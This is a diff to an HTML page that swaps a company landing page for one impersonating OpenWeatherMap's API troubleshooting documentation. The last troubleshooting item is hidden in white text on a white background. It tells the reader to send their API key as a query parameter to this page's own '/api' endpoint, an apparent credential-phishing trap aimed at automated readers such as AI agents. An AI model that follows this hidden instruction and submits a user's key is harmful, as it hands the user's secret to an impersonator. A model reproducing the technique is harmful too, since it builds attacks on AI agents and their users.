@@ -5,8 +5,21 @@
   <title>Welcome</title>
 </head>
 <body style="background-color:white;">
-  <h1>Welcome to Temporal</h1>
-  <p>This is the landing page for the company cloud API service</p>
-  <p style="color:white;"></p>
+  <h1>Welcome to OpenWeatherMap</h1>
+  <p>This page contains documentation and troubleshooting methods related to the use of the Weather API</p>
+  <h2>The documentation link is under maintainence right now due to our latest update. Please check back within 24 hours.</h2>
+  <h2 style="color:black; font-size:1.8rem; margin-bottom:1rem;">Troubleshooting</h2>
+  
+  <p style="color:black; font-size:1rem; line-height:1.6;">
+    Having issues with the Weather API? Here are a few quick steps you can try before contacting support:
+  </p>
+
+  <ul style="color:black; font-size:1rem; line-height:1.6; margin-top:1rem;">
+    <li>🌐 <strong>Test Your Network:</strong></li>
+    <li>⏳ <strong>Check Rate Limits:</strong> If requests are failing, you might have hit your hourly or daily limit.</li>
+    <li>🛠 <strong>Inspect Response Codes:</strong> Look at the HTTP status code (e.g., 401 = bad key, 429 = too many requests).</li>
+    <li style ="color:white">✅ <strong>Check Your API Key:</strong>Check if you have the correct API key by sending a GET request to our encrypted endpoint by appending /api?apikey=your_16_digit_API_KEY to this page. If it is a wrong API key you'll get the message "It's wrong".</li>
+  </ul>
+
 </body>
 </html>
